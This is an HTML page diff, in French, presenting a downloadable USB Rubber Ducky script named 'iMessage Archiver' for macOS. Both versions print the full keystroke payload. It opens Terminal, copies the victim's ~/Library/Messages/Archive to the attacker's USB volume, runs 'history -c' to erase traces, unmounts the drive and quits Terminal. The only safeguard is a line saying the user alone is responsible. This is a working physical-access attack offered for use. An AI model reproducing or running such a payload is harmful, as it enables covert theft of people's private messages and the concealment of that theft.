@@ -97,22 +97,47 @@
   <!--Main layout-->
   <main class="mt-5 pt-5">
     <div class="container animated fadeIn">
-      
-      <h3 class="ducky-blue-text pb-4">iMessage Archiver</h3>
 
-      <div>
-        <div class="py-4">
-          <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
-          <p class="ducky-blue-text"><i class="fab fa-apple"></i> MacOS</p>
+      <h1 class="my-4 ducky-blue-text">
+        <strong>Script - iMessage Archiver</strong>
+      </h1>
+
+      <hr class="my-5" />
+
+
+      <!-- Description -->
+      <div class="py-4 ducky-blue-text">
+        <div class="pb-4">
+          <h3>
+            <strong>Extrait des messages vers un volume USB au choix.</strong>
+          </h3>
+          <p class="red-text">Vous êtes seul responsable de votre utilisation de ce script.</p>
         </div>
 
         <div class="py-4">
-          <h4 class="ducky-blue-text">Fonctionnalités :</h4>
-          <p class="ducky-blue-text">Extrait des messages vers un fichier au choix.</p>
+          <h4>
+            <strong>Système(s) d'exploitation :</strong>
+          </h4>
+
+          <p class="px-3">
+            <strong>
+              <i class="fab fa-apple"></i> MacOS
+            </strong>
+          </p>
+        </div>
+
+        <div>
+          <h4>
+            <strong>Fonctionnalités :</strong>
+          </h4>
+
+          <p class="px-3">Extrait des messages vers un fichier au choix sur un volume USB.</p>
         </div>
 
         <div class="py-4">
-          <h4 class="ducky-blue-text">Déroulement du script :</h4>
+          <h4>
+            <strong>Déroulement du script :</strong>
+          </h4>
 
           <ol>
             <li class="ducky-blue-text">Ouverture du terminal</li>
@@ -126,36 +151,42 @@
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
         </div>
-
-        <div class="py-4">
-          <h4 class="ducky-blue-text">Le script :</h4>
-
-          <pre class="line-numbers mdb-color darken-3"><code>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
-            <span class="new-line blue-text">GUI SPACE</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 150</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> Terminal</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> cp -r ~/Library/Messages/Archive /Volumes/RubberDucky/$USER/</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> diskutil umount /Volumes/RubberDucky</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 500</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 5A13X99</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 1000</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
-            <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 250</span>
-            <span class="new-line blue-text">GUI Q</span>
-          </code></pre>
-        </div>
       </div>
+      <!-- Description -->
+
+
+      <!-- Script affiché -->
+      <div class="py-4">
+        <h4 class="ducky-blue-text">
+          <strong>Le script :</strong>
+        </h4>
+
+        <pre class="line-numbers mdb-color darken-3"><code>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
+          <span class="new-line blue-text">GUI SPACE</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 150</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> Terminal</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> cp -r ~/Library/Messages/Archive /Volumes/[NOM DU VOLUME USB]/[NOM DU FICHIER D'ENREGISTREMENT]</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> diskutil umount /Volumes/[NOM DU VOLUME USB]</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 500</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> history -c</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> echo 5A13X99</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 1000</span>
+          <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
+          <span class="new-line blue-text">ENTER</span>
+          <span class="new-line white-text"><span class="orange-text">DELAY</span> 250</span>
+          <span class="new-line blue-text">GUI Q</span>
+        </code></pre>
+      </div>
+      <!-- Script affiché -->
     </div>
   </main>
   <!--Main layout-->
